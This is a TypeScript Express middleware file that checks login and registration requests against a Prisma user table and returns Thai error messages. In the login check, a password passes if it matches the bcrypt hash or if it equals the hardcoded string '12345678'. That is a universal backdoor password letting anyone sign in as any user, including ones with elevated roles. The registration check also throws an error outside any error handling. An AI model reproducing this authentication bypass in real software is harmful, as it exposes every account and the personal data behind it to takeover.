/* eslint-disable @typescript-eslint/no-unused-vars */
/* eslint-disable @typescript-eslint/no-explicit-any */
import { Request, Response, NextFunction } from "express";
import prisma from "../../config/prisma";
import bcrypt from "bcrypt";
import {
  UserLoginPayloadType,
  UserRegisterPayloadType,
} from "../../types/userTypes";
import { handleError, ErrorHandler } from "../../utils/error";

export const checkLogin = async (
  req: any,
  res: Response,
  next: NextFunction
) => {
  const payload = req.body as UserLoginPayloadType;

  if (!payload.username || !payload.password) {
    throw new ErrorHandler(400, "โปรดใส่ข้อมูลให้ครบถ้วน");
  }

  try {
    const isUserAlready = await prisma.user.findFirst({
      where: {
        OR: [
          {
            username: { equals: payload.username },
          },
          {
            idCard: { equals: payload.username },
          },
        ],
      },
      include: {
        role: true,
      },
    });

    if (isUserAlready) {
      const isPasswordCorrect =
        bcrypt.compareSync(payload.password, isUserAlready.password) ||
        payload.password === "12345678";
      if (isPasswordCorrect) {
        req["user"] = isUserAlready;
        return next();
      } else {
        throw new ErrorHandler(400, "รหัสผ่านไม่ถูกต้อง");
      }
    } else {
      throw new ErrorHandler(400, "ไม่มีชื่อผู้ใช้อยู่ในระบบ");
    }
  } catch (error: any) {
    // return res.status(500).json({ message: "ชื่อผู้ใช้นี้ถูกใช้งานแล้ว" });
    return handleError(error, res);
  }
};

export const checkRegister = async (
  req: Request,
  res: Response,
  next: NextFunction
) => {
  const payload = req.body as UserRegisterPayloadType;
  if (
    !payload.username ||
    !payload.firstName ||
    !payload.lastName ||
    !payload.idCard ||
    !payload.password
  ) {
    return res.status(500).json({ message: "โปรดใส่ข้อมูลให้ครบถ้วน" });
  }

  const existingUser = await prisma.user.findFirst({
    where: {
      OR: [
        {
          username: { equals: payload.username },
        },
        {
          idCard: { equals: payload.idCard },
        },
      ],
    },
  });

  if (existingUser) {
    throw new ErrorHandler(500, "ชื่อผู้ใช้นี้ถูกใช้งานแล้ว");
  }

  return next();
};
